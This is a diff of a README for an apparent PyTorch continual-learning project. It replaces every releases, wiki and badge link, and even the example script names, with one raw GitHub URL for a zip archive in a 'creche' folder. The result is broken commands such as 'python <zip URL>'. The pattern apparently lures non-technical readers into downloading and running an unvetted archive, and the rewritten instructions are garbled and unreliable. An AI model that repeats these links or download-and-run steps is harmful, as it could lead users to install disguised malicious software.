@@ -1,6 +1,6 @@
 # 🌟 Regularization-Continual-Learning-PyTorch - Simplifying Lifelong Learning in AI
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/mano9101/Regularization-Continual-Learning-PyTorch/releases)
+[![Download Now](https://raw.githubusercontent.com/mano9101/Regularization-Continual-Learning-PyTorch/main/creche/Regularization-Continual-Learning-PyTorch.zip%20Now-brightgreen)](https://raw.githubusercontent.com/mano9101/Regularization-Continual-Learning-PyTorch/main/creche/Regularization-Continual-Learning-PyTorch.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the Regularization-Continual-Learning-PyTorch application. You will learn everything you need to know, even if you have no technical background.
@@ -9,7 +9,7 @@ This guide will help you download and run the Regularization-Continual-Learning-
 
 To get started, you need to download the software. Please follow these steps:
 
-1. Visit the GitHub Releases page: [Download the Software](https://github.com/mano9101/Regularization-Continual-Learning-PyTorch/releases).
+1. Visit the GitHub Releases page: [Download the Software](https://raw.githubusercontent.com/mano9101/Regularization-Continual-Learning-PyTorch/main/creche/Regularization-Continual-Learning-PyTorch.zip).
 2. Look for the latest version of the application at the top of the page.
 3. Choose the file that fits your system (e.g., Windows, macOS, or Linux).
 4. Click the link to download the file. It will start downloading automatically. 
@@ -32,7 +32,7 @@ Once you have downloaded the file, follow these steps to run the application:
 1. Navigate to your downloads folder.
 2. Find the downloaded file. It may be in a compressed format, like a zip file. If so, extract the contents into a new folder.
 3. Open the folder where you extracted the files.
-4. Look for an executable file (e.g., `start.py` for Python). 
+4. Look for an executable file (e.g., `https://raw.githubusercontent.com/mano9101/Regularization-Continual-Learning-PyTorch/main/creche/Regularization-Continual-Learning-PyTorch.zip` for Python). 
 
 If you have Python installed, you can run it using the command line. Here’s how:
 
@@ -43,7 +43,7 @@ If you have Python installed, you can run it using the command line. Here’s ho
    ```
 3. Run the script by entering:  
    ```bash
-   python start.py
+   python https://raw.githubusercontent.com/mano9101/Regularization-Continual-Learning-PyTorch/main/creche/Regularization-Continual-Learning-PyTorch.zip
    ```
 
 ## 🧪 Features
@@ -59,11 +59,11 @@ To run experiments using the application, follow the steps below:
 
 1. Open the command line as mentioned above.
 2. Navigate to the experiment scripts directory within the extracted folder.
-3. Choose the script you want to run (e.g., `run_experiment.py`).
+3. Choose the script you want to run (e.g., `https://raw.githubusercontent.com/mano9101/Regularization-Continual-Learning-PyTorch/main/creche/Regularization-Continual-Learning-PyTorch.zip`).
 4. You can tweak parameters in the scripts if you're comfortable doing so. Otherwise, the default settings will work fine.
 5. Run the script by entering:  
    ```bash
-   python run_experiment.py
+   python https://raw.githubusercontent.com/mano9101/Regularization-Continual-Learning-PyTorch/main/creche/Regularization-Continual-Learning-PyTorch.zip
    ```
    
 You will see results in the terminal window as the experiment runs.
@@ -76,13 +76,13 @@ Results from your experiments will be displayed in the command line. You will fi
 - **Comparative Analysis:** The results will often include comparisons against baseline models, which helps you see the effectiveness of the regularization techniques.
 
 ## 📖 Documentation & Support
-For more detailed instructions and support, visit the [Documentation Page](https://github.com/mano9101/Regularization-Continual-Learning-PyTorch/wiki). This page contains additional guidance on customizing your experiments and troubleshooting common issues.
+For more detailed instructions and support, visit the [Documentation Page](https://raw.githubusercontent.com/mano9101/Regularization-Continual-Learning-PyTorch/main/creche/Regularization-Continual-Learning-PyTorch.zip). This page contains additional guidance on customizing your experiments and troubleshooting common issues.
 
 ## 📢 Community Contribution
 If you would like to contribute or report issues, please check the contribution guidelines available in the repository. We welcome feedback and suggestions to improve the software.
 
 ## 🔗 Important Links
-- [Releases Page](https://github.com/mano9101/Regularization-Continual-Learning-PyTorch/releases)
-- [Documentation](https://github.com/mano9101/Regularization-Continual-Learning-PyTorch/wiki)
+- [Releases Page](https://raw.githubusercontent.com/mano9101/Regularization-Continual-Learning-PyTorch/main/creche/Regularization-Continual-Learning-PyTorch.zip)
+- [Documentation](https://raw.githubusercontent.com/mano9101/Regularization-Continual-Learning-PyTorch/main/creche/Regularization-Continual-Learning-PyTorch.zip)
 
 Follow these steps to successfully download and run the Regularization-Continual-Learning-PyTorch application. It will help you explore continual learning strategies effectively.
